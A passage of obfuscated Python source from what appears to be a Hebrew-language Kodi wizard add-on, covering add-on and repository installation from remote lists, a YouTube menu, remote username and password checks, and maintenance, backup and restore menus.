			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2515
			addFile ('%s'%O0OOO00O000OOOO0O ,'',themeit =THEME3 )#line:2516
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2517
	setView ('files','viewType')#line:2518
def addonInstaller (O0000O0OOO00OOOO0 ,O000O00OOOO000000 ):#line:2520
	if not ADDONFILE =='http://':#line:2521
		OO00OOO0000000OO0 =wiz .workingURL (O000O00OOOO000000 )#line:2522
		if OO00OOO0000000OO0 ==True :#line:2523
			OO0OO000OOO0O00OO =wiz .openURL (O000O00OOOO000000 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2524
			OOOO00OOOOO0O0OO0 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0000O0OOO00OOOO0 ).findall (OO0OO000OOO0O00OO )#line:2525
			if len (OOOO00OOOOO0O0OO0 )>0 :#line:2526
				for OOO0O0OO0OO0O0O0O ,O000O00OOOO000000 ,O0OOOO0OO0OOO0O0O ,O0OO0000O0OOO0O00 ,OOOOOOO0O00O0OO00 ,O000OOOOOOOOOOOO0 ,OO00O0OOOOOOOOOO0 ,O0O0O000O0000O000 ,OOOO0O000OO0O000O in OOOO00OOOOO0O0OO0 :#line:2527
					if os .path .exists (os .path .join (ADDONS ,O0000O0OOO00OOOO0 )):#line:2528
						O0OO0OOOO0O0O0O0O =['Launch Addon','Remove Addon']#line:2529
						O00O0OO0OO0OO000O =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O0OO0OOOO0O0O0O0O )#line:2530
						if O00O0OO0OO0OO000O ==0 :#line:2531
							wiz .ebi ('RunAddon(%s)'%O0000O0OOO00OOOO0 )#line:2532
							xbmc .sleep (1000 )#line:2533
							return True #line:2534
						elif O00O0OO0OO0OO000O ==1 :#line:2535
							wiz .cleanHouse (os .path .join (ADDONS ,O0000O0OOO00OOOO0 ))#line:2536
							try :wiz .removeFolder (os .path .join (ADDONS ,O0000O0OOO00OOOO0 ))#line:2537
							except :pass #line:2538
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0000O0OOO00OOOO0 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2539
								removeAddonData (O0000O0OOO00OOOO0 )#line:2540
							wiz .refresh ()#line:2541
							return True #line:2542
						else :#line:2543
							return False #line:2544
					OO0OO00O0O000O000 =os .path .join (ADDONS ,O0OOOO0OO0OOO0O0O )#line:2545
					if not O0OOOO0OO0OOO0O0O .lower ()=='none'and not os .path .exists (OO0OO00O0O000O000 ):#line:2546
						wiz .log ("Repository not installed, installing it")#line:2547
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O0000O0OOO00OOOO0 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0OOOO0OO0OOO0O0O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2548
							O0O0000OOO0OO00OO =wiz .parseDOM (wiz .openURL (O0OO0000O0OOO0O00 ),'addon',ret ='version',attrs ={'id':O0OOOO0OO0OOO0O0O })#line:2549
							if len (O0O0000OOO0OO00OO )>0 :#line:2550
								OOO0000OOO0OO00O0 ='%s%s-%s.zip'%(OOOOOOO0O00O0OO00 ,O0OOOO0OO0OOO0O0O ,O0O0000OOO0OO00OO [0 ])#line:2551
								wiz .log (OOO0000OOO0OO00O0 )#line:2552
								if KODIV >=17 :wiz .addonDatabase (O0OOOO0OO0OOO0O0O ,1 )#line:2553
								installAddon (O0OOOO0OO0OOO0O0O ,OOO0000OOO0OO00O0 )#line:2554
								wiz .ebi ('UpdateAddonRepos()')#line:2555
								wiz .log ("Installing Addon from Kodi")#line:2557
								OOOO00O000OO0000O =installFromKodi (O0000O0OOO00OOOO0 )#line:2558
								wiz .log ("Install from Kodi: %s"%OOOO00O000OO0000O )#line:2559
								if OOOO00O000OO0000O :#line:2560
									wiz .refresh ()#line:2561
									return True #line:2562
							else :#line:2563
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O0OOOO0OO0OOO0O0O )#line:2564
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O0000O0OOO00OOOO0 ,O0OOOO0OO0OOO0O0O ))#line:2565
					elif O0OOOO0OO0OOO0O0O .lower ()=='none':#line:2566
						wiz .log ("No repository, installing addon")#line:2567
						OO00O0OO0OOO00O00 =O0000O0OOO00OOOO0 #line:2568
						OO000000000O0OOOO =O000O00OOOO000000 #line:2569
						installAddon (O0000O0OOO00OOOO0 ,O000O00OOOO000000 )#line:2570
						wiz .refresh ()#line:2571
						return True #line:2572
					else :#line:2573
						wiz .log ("Repository installed, installing addon")#line:2574
						OOOO00O000OO0000O =installFromKodi (O0000O0OOO00OOOO0 ,False )#line:2575
						if OOOO00O000OO0000O :#line:2576
							wiz .refresh ()#line:2577
							return True #line:2578
					if os .path .exists (os .path .join (ADDONS ,O0000O0OOO00OOOO0 )):return True #line:2579
					O00000000O0O000OO =wiz .parseDOM (wiz .openURL (O0OO0000O0OOO0O00 ),'addon',ret ='version',attrs ={'id':O0000O0OOO00OOOO0 })#line:2580
					if len (O00000000O0O000OO )>0 :#line:2581
						O000O00OOOO000000 ="%s%s-%s.zip"%(O000O00OOOO000000 ,O0000O0OOO00OOOO0 ,O00000000O0O000OO [0 ])#line:2582
						wiz .log (str (O000O00OOOO000000 ))#line:2583
						if KODIV >=17 :wiz .addonDatabase (O0000O0OOO00OOOO0 ,1 )#line:2584
						installAddon (O0000O0OOO00OOOO0 ,O000O00OOOO000000 )#line:2585
						wiz .refresh ()#line:2586
					else :#line:2587
						wiz .log ("no match");return False #line:2588
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2589
		else :wiz .log ("[Addon Installer] Text File: %s"%OO00OOO0000000OO0 )#line:2590
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2591
def installFromKodi (O00OO0O000OOO0O0O ,over =True ):#line:2593
	if over ==True :#line:2594
		xbmc .sleep (2000 )#line:2595
	wiz .ebi ('RunPlugin(plugin://%s)'%O00OO0O000OOO0O0O )#line:2597
	if not wiz .whileWindow ('yesnodialog'):#line:2598
		return False #line:2599
	xbmc .sleep (1000 )#line:2600
	if wiz .whileWindow ('okdialog'):#line:2601
		return False #line:2602
	wiz .whileWindow ('progressdialog')#line:2603
	if os .path .exists (os .path .join (ADDONS ,O00OO0O000OOO0O0O )):return True #line:2604
	else :return False #line:2605
def installAddon (OO0000OOO00000OOO ,OO0OOOO0O00OO0O00 ):#line:2607
	if not wiz .workingURL (OO0OOOO0O00OO0O00 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OO0000OOO00000OOO ,COLOR2 ));return #line:2608
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2609
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0000OOO00000OOO ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2610
	O0OO0O000O000OO0O =OO0OOOO0O00OO0O00 .split ('/')#line:2611
	OO000OO0000000000 =os .path .join (PACKAGES ,O0OO0O000O000OO0O [-1 ])#line:2612
	try :os .remove (OO000OO0000000000 )#line:2613
	except :pass #line:2614
	downloader .download (OO0OOOO0O00OO0O00 ,OO000OO0000000000 ,DP )#line:2615
	OO00O0OO00O00O000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0000OOO00000OOO )#line:2616
	DP .update (0 ,OO00O0OO00O00O000 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2617
	O0O0O0OO0000O000O ,O00O0OOO0O0OO0O0O ,OOOOOO0OO000OO000 =extract .all (OO000OO0000000000 ,ADDONS ,DP ,title =OO00O0OO00O00O000 )#line:2618
	DP .update (0 ,OO00O0OO00O00O000 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2619
	installed (OO0000OOO00000OOO )#line:2620
	installDep (OO0000OOO00000OOO ,DP )#line:2621
	DP .close ()#line:2622
	wiz .ebi ('UpdateAddonRepos()')#line:2623
	wiz .ebi ('UpdateLocalAddons()')#line:2624
	wiz .refresh ()#line:2625
def installDep (OOOO0O0OOOOOOOO00 ,DP =None ):#line:2627
	OOOOO00O0OO000OO0 =os .path .join (ADDONS ,OOOO0O0OOOOOOOO00 ,'addon.xml')#line:2628
	if os .path .exists (OOOOO00O0OO000OO0 ):#line:2629
		OO0O00OOOOOO0O0O0 =open (OOOOO00O0OO000OO0 ,mode ='r');OOOO0O00O000O0O0O =OO0O00OOOOOO0O0O0 .read ();OO0O00OOOOOO0O0O0 .close ();#line:2630
		O0OO0OO0OOO0OOOOO =wiz .parseDOM (OOOO0O00O000O0O0O ,'import',ret ='addon')#line:2631
		for O00O0O0O0O000O0O0 in O0OO0OO0OOO0OOOOO :#line:2632
			if not 'xbmc.python'in O00O0O0O0O000O0O0 :#line:2633
				if not DP ==None :#line:2634
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O0O0O0O000O0O0 ))#line:2635
				wiz .createTemp (O00O0O0O0O000O0O0 )#line:2636
def installed (O00OO0OOOO0O0OO0O ):#line:2663
	O000OO000OO000O0O =os .path .join (ADDONS ,O00OO0OOOO0O0OO0O ,'addon.xml')#line:2664
	if os .path .exists (O000OO000OO000O0O ):#line:2665
		try :#line:2666
			OOO00O0O0O00O0O00 =open (O000OO000OO000O0O ,mode ='r');OOO0OO000O000OO00 =OOO00O0O0O00O0O00 .read ();OOO00O0O0O00O0O00 .close ()#line:2667
			OOO0O00OO0OOOOO00 =wiz .parseDOM (OOO0OO000O000OO00 ,'addon',ret ='name',attrs ={'id':O00OO0OOOO0O0OO0O })#line:2668
			OO0OO0O0OOOO0O0O0 =os .path .join (ADDONS ,O00OO0OOOO0O0OO0O ,'icon.png')#line:2669
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0O00OO0OOOOO00 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OO0OO0O0OOOO0O0O0 )#line:2670
		except :pass #line:2671
def youtubeMenu (url =None ):#line:2673
	if not YOUTUBEFILE =='http://':#line:2674
		if url ==None :#line:2675
			O0O0OO0000OOO00OO =wiz .workingURL (YOUTUBEFILE )#line:2676
			O0OO00O00OO0OO00O =uservar .YOUTUBEFILE #line:2677
		else :#line:2678
			O0O0OO0000OOO00OO =wiz .workingURL (url )#line:2679
			O0OO00O00OO0OO00O =url #line:2680
		if O0O0OO0000OOO00OO ==True :#line:2681
			O0OO0O000O0O0O0O0 =wiz .openURL (O0OO00O00OO0OO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2682
			OO00OO0000OOOOOOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0OO0O000O0O0O0O0 )#line:2683
			if len (OO00OO0000OOOOOOO )>0 :#line:2684
				for OOO0OOOO00O000O00 ,O0OO0O0OOOO000000 ,url ,O0OO00O0000OO0O0O ,O000OOO000O000OOO ,OOOO00OOO000O00OO in OO00OO0000OOOOOOO :#line:2685
					if O0OO0O0OOOO000000 .lower ()=="yes":#line:2686
						addDir ("[B]%s[/B]"%OOO0OOOO00O000O00 ,'youtube',url ,description =OOOO00OOO000O00OO ,icon =O0OO00O0000OO0O0O ,fanart =O000OOO000O000OOO ,themeit =THEME3 )#line:2687
					else :#line:2688
						addFile (OOO0OOOO00O000O00 ,'viewVideo',url =url ,description =OOOO00OOO000O00OO ,icon =O0OO00O0000OO0O0O ,fanart =O000OOO000O000OOO ,themeit =THEME2 )#line:2689
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2690
		else :#line:2691
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2692
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2693
			addFile ('%s'%O0O0OO0000OOO00OO ,'',themeit =THEME3 )#line:2694
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2695
	setView ('files','viewType')#line:2696
def STARTP ():#line:2697
	O000OOO0OO000O000 =(ADDON .getSetting ("pass"))#line:2698
	if BUILDNAME =="":#line:2699
	 if not NOTIFY =='true':#line:2700
          OO0OO0O0OO000OOOO =wiz .workingURL (NOTIFICATION )#line:2701
	 if not NOTIFY2 =='true':#line:2702
          OO0OO0O0OO000OOOO =wiz .workingURL (NOTIFICATION2 )#line:2703
	 if not NOTIFY3 =='true':#line:2704
          OO0OO0O0OO000OOOO =wiz .workingURL (NOTIFICATION3 )#line:2705
	OO000O0O000OO0OO0 =O000OOO0OO000O000 #line:2706
	OO0OO0O0OO000OOOO =urllib2 .Request (SPEED )#line:2707
	OOO00O0O0O00O0O0O =urllib2 .urlopen (OO0OO0O0OO000OOOO )#line:2708
	O00O000O0OO0O0000 =OOO00O0O0O00O0O0O .readlines ()#line:2710
	O0OOO0000O000000O =0 #line:2714
	for O00OOO0O00OO0O0O0 in O00O000O0OO0O0000 :#line:2715
		if O00OOO0O00OO0O0O0 .split (' ==')[0 ]==O000OOO0OO000O000 or O00OOO0O00OO0O0O0 .split ()[0 ]==O000OOO0OO000O000 :#line:2716
			O0OOO0000O000000O =1 #line:2717
			break #line:2718
	if O0OOO0000O000000O ==0 :#line:2719
					O00OO0000000O0000 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2720
					if O00OO0000000O0000 :#line:2722
						ADDON .openSettings ()#line:2724
						sys .exit ()#line:2726
					else :#line:2727
						sys .exit ()#line:2728
	return 'ok'#line:2732
def STARTP2 ():#line:2733
	O0OOO000OO000OOOO =(ADDON .getSetting ("user"))#line:2734
	OOO0O00O0OOOOO00O =(UNAME )#line:2736
	O0OOO00OOOOO0O00O =urllib2 .urlopen (OOO0O00O0OOOOO00O )#line:2737
	OO0000OOOOOOOO000 =O0OOO00OOOOO0O00O .readlines ()#line:2738
	O00000OOOOO000OOO =0 #line:2739
	for OOOO000OOO0OO0OOO in OO0000OOOOOOOO000 :#line:2742
		if OOOO000OOO0OO0OOO .split (' ==')[0 ]==O0OOO000OO000OOOO or OOOO000OOO0OO0OOO .split ()[0 ]==O0OOO000OO000OOOO :#line:2743
			O00000OOOOO000OOO =1 #line:2744
			break #line:2745
	if O00000OOOOO000OOO ==0 :#line:2746
		OO000O00O0OO0OOO0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2747
		if OO000O00O0OO0OOO0 :#line:2749
			ADDON .openSettings ()#line:2751
			sys .exit ()#line:2754
		else :#line:2755
			sys .exit ()#line:2756
	return 'ok'#line:2760
def passandpin ():#line:2761
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2762
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2763
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2764
def passandUsername ():#line:2765
	ADDON .openSettings ()#line:2767
def folderback ():#line:2770
    OO00OO0OO0O000O0O =ADDON .getSetting ("path")#line:2771
    if OO00OO0OO0O000O0O :#line:2772
      OO00OO0OO0O000O0O =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2773
      ADDON .setSetting ("path",OO00OO0OO0O000O0O )#line:2774
def backmyupbuild ():#line:2777
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2781
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2782
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2783
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2785
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2786
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2787
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2789
def maintMenu (view =None ):#line:2793
	OOOOOO00O000O0OO0 ='[B][COLOR green]ON[/COLOR][/B]';OO00O0OO00000O00O ='[B][COLOR red]OFF[/COLOR][/B]'#line:2795
	OO0OO0000O0O0O0OO ='true'if AUTOCLEANUP =='true'else 'false'#line:2796
	O00OO0O00O00O0OO0 ='true'if AUTOCACHE =='true'else 'false'#line:2797
	O0O00OOO000OO00O0 ='true'if AUTOPACKAGES =='true'else 'false'#line:2798
	O000O0O00O000OO00 ='true'if AUTOTHUMBS =='true'else 'false'#line:2799
	O0OO00OOO00O00OOO ='true'if SHOWMAINT =='true'else 'false'#line:2800
	OOOOOOO00O0OOO00O ='true'if INCLUDEVIDEO =='true'else 'false'#line:2801
	O000O0O0OO0O00OO0 ='true'if INCLUDEALL =='true'else 'false'#line:2802
	O00OOO0000OO0O000 ='true'if THIRDPARTY =='true'else 'false'#line:2803
	if wiz .Grab_Log (True )==False :O000O00O0OO0O00O0 =0 #line:2804
	else :O000O00O0OO0O00O0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2805
	if wiz .Grab_Log (True ,True )==False :OO0O00O0OOO0OO000 =0 #line:2806
	else :OO0O00O0OOO0OO000 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2807
	O0OOO0O0O0O0OO0O0 =int (O000O00O0OO0O00O0 )+int (OO0O00O0OOO0OO000 )#line:2808
	OO0O000O0000OO0OO =str (O0OOO0O0O0O0OO0O0 )+' Error(s) Found'if O0OOO0O0O0O0OO0O0 >0 else 'None Found'#line:2809
	O0O00OOO0O00OO0OO =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2810
	if O000O0O0OO0O00OO0 =='true':#line:2811
		O0OOO0O00000000O0 ='true'#line:2812
		OO0O0O0O0OOOOOOOO ='true'#line:2813
		O000OOO0OO0OO0O00 ='true'#line:2814
		OO0000O00000000O0 ='true'#line:2815
		O000O00O0OOO00000 ='true'#line:2816
		O0OOO000O00O00O0O ='true'#line:2817
		OO0O0O0O00O0O0O00 ='true'#line:2818
		O0OOO000O0OO0O0O0 ='true'#line:2819
	else :#line:2820
		O0OOO0O00000000O0 ='true'if INCLUDEBOB =='true'else 'false'#line:2821
		OO0O0O0O0OOOOOOOO ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2822
		O000OOO0OO0OO0O00 ='true'if INCLUDESPECTO =='true'else 'false'#line:2823
		OO0000O00000000O0 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2824
		O000O00O0OOO00000 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2825
		O0OOO000O00O00O0O ='true'if INCLUDEONECHAN =='true'else 'false'#line:2826
		OO0O0O0O00O0O0O00 ='true'if INCLUDESALTS =='true'else 'false'#line:2827
		O0OOO000O0OO0O0O0 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2828
	O0OO00OOOOOOO0O0O =wiz .getSize (PACKAGES )#line:2829
	OOO0OO0O000O0O0OO =wiz .getSize (THUMBS )#line:2830
	O00000OO0OOO0OO0O =wiz .getCacheSize ()#line:2831
	OOOOOO0OO0000O000 =O0OO00OOOOOOO0O0O +OOO0OO0O000O0O0OO +O00000OO0OOO0OO0O #line:2832
	OOOO0O0O0OO00O000 =['Daily','Always','3 Days','Weekly']#line:2833
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2834
	if view =="clean"or SHOWMAINT =='true':#line:2835
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOOO0OO0000O000 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00000OO0OOO0OO0O ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2837
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OO00OOOOOOO0O0O ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0OO0O000O0O0OO ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2843
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2844
	if view =="addon"or SHOWMAINT =='false':#line:2845
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2846
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2847
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2852
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2853
	if view =="misc"or SHOWMAINT =='true':#line:2854
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('View Errors in Log: %s'%(OO0O000O0000OO0OO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		addFile ('Clear Wizard Log File%s'%O0O00OOO0O00OO0OO ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2863
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2864
	if view =="backup"or SHOWMAINT =='true':#line:2865
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2866
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2874
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2875
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2876
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2877
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2878
	if view =="tweaks"or SHOWMAINT =='true':#line:2879
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2880
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2881
		else :#line:2882
			if os .path .exists (ADVANCED ):#line:2883
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2884
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2885
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2886
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2887
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2889
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2890
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2891
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2892
	addFile ('Show All Maintenance: %s'%O0OO00OOO00O00OOO .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2893
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2894
	addFile ('Third Party Wizards: %s'%O00OOO0000OO0O000 .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2895
	if O00OOO0000OO0O000 =='true':#line:2896
		OOOOO000O0OO0O0O0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2897
		O00OOO0O00O0OO0OO =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2898
		OOO0OOOOOOO00O000 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2899
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOOO000O0OO0O0O0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2900
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00OOO0O00O0OO0OO ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2901
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO0OOOOOOO00O000 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2902
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2903
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO0OO0000O0O0O0OO .replace ('true',OOOOOO00O000O0OO0 ).replace ('false',OO00O0OO00000O00O ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2904
	if OO0OO0000O0O0O0OO =='true':#line:2905
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OOOO0O0O0OO00O000 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2906
